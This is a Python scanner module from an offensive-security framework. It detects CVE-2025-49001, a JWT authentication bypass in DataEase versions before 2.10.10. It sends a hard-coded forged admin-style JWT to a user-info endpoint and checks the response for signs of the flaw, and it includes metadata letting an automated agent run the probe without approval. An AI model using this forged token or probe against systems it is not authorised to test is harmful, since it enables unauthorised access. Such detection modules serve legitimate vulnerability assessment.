#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""DataEase < 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'DataEase < 2.10.10 - JWT Authentication Bypass Detection',
        'description': 'DataEase < 2.10.10 contains a broken authentication caused by ineffective secret verification, letting users forge JWT tokens, exploit requires no special privileges.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'dataease', 'auth-bypass', 'jwt', 'unauth'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/dataease/dataease/security/advisories/GHSA-xx2m-gmwg-mf3r',
            'https://github.com/dataease/dataease',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-49001',
        ],
        'cve': 'CVE-2025-49001',
    }

    def run(self):
        path = '/de2api/user/info'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 401:
            return False
        body = r.text or ""
        body_any = ('token is empty',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/de2api/user/info'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'X-DE-TOKEN': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsIm9pZCI6MSwiZXhwIjo5OTk5OTk5OTk5fQ.tDSRWgqgE9BTy9NDpTE0ZAI2GKxOFPllYz-jOJu635A'})
        if not r or r.status_code != 400:
            return False
        body = (r.text or "").lower()
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items()).lower()
        body_any = ('getwriter() has already been called',)
        header_any = ('de-gateway-flag', 'hmacsha256',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='critical', reason='DataEase < 2.10.10 - JWT Authentication Bypass detected', path=path)
            return True
        return False

